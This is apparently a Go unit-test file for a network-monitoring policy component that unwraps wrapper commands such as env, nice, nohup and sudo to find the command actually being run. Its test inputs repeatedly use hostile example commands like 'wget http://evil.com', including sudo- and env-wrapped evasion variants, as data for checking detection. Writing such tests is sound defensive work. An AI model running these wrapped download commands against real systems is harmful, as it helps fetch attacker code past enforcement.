package netmonitor

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestUnwrapTransparentCommand_NoUnwrap(t *testing.T) {
	cmd, args, depth := UnwrapTransparentCommand("/usr/bin/git", []string{"git", "status"}, nil)
	assert.Equal(t, "/usr/bin/git", cmd)
	assert.Equal(t, []string{"git", "status"}, args)
	assert.Equal(t, 0, depth)
}

func TestUnwrapTransparentCommand_Env(t *testing.T) {
	cmd, args, depth := UnwrapTransparentCommand("/usr/bin/env", []string{"env", "wget", "http://evil.com"}, nil)
	assert.Equal(t, "wget", cmd)
	assert.Equal(t, []string{"wget", "http://evil.com"}, args)
	assert.Equal(t, 1, depth)
}

func TestUnwrapTransparentCommand_EnvWithFlags(t *testing.T) {
	cmd, args, depth := UnwrapTransparentCommand("/usr/bin/env", []string{"env", "-i", "FOO=bar", "wget", "http://evil.com"}, nil)
	assert.Equal(t, "wget", cmd)
	assert.Equal(t, []string{"wget", "http://evil.com"}, args)
	assert.Equal(t, 1, depth)
}

func TestUnwrapTransparentCommand_Nice(t *testing.T) {
	// With the simplified heuristic, -n is skipped as a flag but 10 is the
	// first non-flag/non-assignment arg. This is safe: "10" won't match any
	// command rule and will hit default-deny. The real payload "wget" would
	// be caught by network enforcement as a backstop.
	cmd, args, depth := UnwrapTransparentCommand("/usr/bin/nice", []string{"nice", "-n", "10", "wget", "http://evil.com"}, nil)
	assert.Equal(t, "10", cmd)
	assert.Equal(t, []string{"10", "wget", "http://evil.com"}, args)
	assert.Equal(t, 1, depth)
}

func TestUnwrapTransparentCommand_Nohup(t *testing.T) {
	cmd, args, depth := UnwrapTransparentCommand("/usr/bin/nohup", []string{"nohup", "wget", "http://evil.com"}, nil)
	assert.Equal(t, "wget", cmd)
	assert.Equal(t, []string{"wget", "http://evil.com"}, args)
	assert.Equal(t, 1, depth)
}

func TestUnwrapTransparentCommand_ChainedWrappers(t *testing.T) {
	// sudo -> nice (transparent) -> picks "5" as payload (not transparent, stops).
	// "5" won't match any command rule -> default-deny is safe.
	cmd, args, depth := UnwrapTransparentCommand("/usr/bin/sudo", []string{"sudo", "nice", "-n", "5", "env", "wget", "http://evil.com"}, nil)
	assert.Equal(t, "5", cmd)
	assert.Equal(t, []string{"5", "env", "wget", "http://evil.com"}, args)
	assert.Equal(t, 2, depth)
}

func TestUnwrapTransparentCommand_NoPayload(t *testing.T) {
	cmd, args, depth := UnwrapTransparentCommand("/usr/bin/env", []string{"env", "-i", "FOO=bar"}, nil)
	assert.Equal(t, "/usr/bin/env", cmd)
	assert.Equal(t, []string{"env", "-i", "FOO=bar"}, args)
	assert.Equal(t, 0, depth)
}

func TestUnwrapTransparentCommand_DepthLimit(t *testing.T) {
	cmd, _, depth := UnwrapTransparentCommand("/usr/bin/env",
		[]string{"env", "env", "env", "env", "env", "env", "wget"}, nil)
	require.LessOrEqual(t, depth, 5)
	_ = cmd
}

func TestUnwrapTransparentCommand_PolicyOverrideAdd(t *testing.T) {
	overrides := &TransparentOverrides{
		Add: []string{"myrunner"},
	}
	cmd, args, depth := UnwrapTransparentCommand("/usr/bin/myrunner", []string{"myrunner", "wget", "http://evil.com"}, overrides)
	assert.Equal(t, "wget", cmd)
	assert.Equal(t, []string{"wget", "http://evil.com"}, args)
	assert.Equal(t, 1, depth)
}

func TestUnwrapTransparentCommand_PolicyOverrideRemove(t *testing.T) {
	overrides := &TransparentOverrides{
		Remove: []string{"sudo"},
	}
	cmd, args, depth := UnwrapTransparentCommand("/usr/bin/sudo", []string{"sudo", "wget"}, overrides)
	assert.Equal(t, "/usr/bin/sudo", cmd)
	assert.Equal(t, []string{"sudo", "wget"}, args)
	assert.Equal(t, 0, depth)
}

func TestUnwrapTransparentCommand_EnvDashI(t *testing.T) {
	// env -i wget: -i is a flag (no value), wget must be found as payload.
	// Previously skipNext would incorrectly consume wget as -i's value.
	cmd, args, depth := UnwrapTransparentCommand("/usr/bin/env", []string{"env", "-i", "wget", "http://evil.com"}, nil)
	assert.Equal(t, "wget", cmd)
	assert.Equal(t, []string{"wget", "http://evil.com"}, args)
	assert.Equal(t, 1, depth)
}

func TestUnwrapTransparentCommand_FlagWithEquals(t *testing.T) {
	// Flags using --key=value syntax are self-contained and skipped.
	cmd, args, depth := UnwrapTransparentCommand("/usr/bin/sudo", []string{"sudo", "--user=root", "wget", "http://evil.com"}, nil)
	assert.Equal(t, "wget", cmd)
	assert.Equal(t, []string{"wget", "http://evil.com"}, args)
	assert.Equal(t, 1, depth)
}

func TestUnwrapTransparentCommand_DoubleDash(t *testing.T) {
	// -- ends flag parsing; next arg is always the payload.
	cmd, args, depth := UnwrapTransparentCommand("/usr/bin/env", []string{"env", "-i", "--", "wget", "http://evil.com"}, nil)
	assert.Equal(t, "wget", cmd)
	assert.Equal(t, []string{"wget", "http://evil.com"}, args)
	assert.Equal(t, 1, depth)
}

func TestIsWindowsStyleFlag(t *testing.T) {
	assert.True(t, isWindowsStyleFlag("/c"))
	assert.True(t, isWindowsStyleFlag("/k"))
	assert.True(t, isWindowsStyleFlag("/S"))
	assert.True(t, isWindowsStyleFlag("/C"))
	assert.False(t, isWindowsStyleFlag("/Cmd"))       // multi-char, not matched
	assert.False(t, isWindowsStyleFlag("/usr/bin"))    // path, not a flag
	assert.False(t, isWindowsStyleFlag("/usr"))        // 3 chars after /, too long
	assert.False(t, isWindowsStyleFlag("-c"))          // not / prefix
	assert.False(t, isWindowsStyleFlag("/"))           // no char after /
	assert.False(t, isWindowsStyleFlag("/1"))          // non-alpha
	assert.False(t, isWindowsStyleFlag("/Command"))    // multi-char
}

func TestIsTransparentCommand(t *testing.T) {
	tests := []struct {
		basename    string
		transparent bool
	}{
		{"env", true},
		{"nice", true},
		{"nohup", true},
		{"sudo", true},
		{"time", true},
		{"xargs", true},
		{"git", false},
		{"curl", false},
		{"wget", false},
	}
	for _, tt := range tests {
		t.Run(tt.basename, func(t *testing.T) {
			assert.Equal(t, tt.transparent, IsTransparentCommand(tt.basename, nil))
		})
	}
}
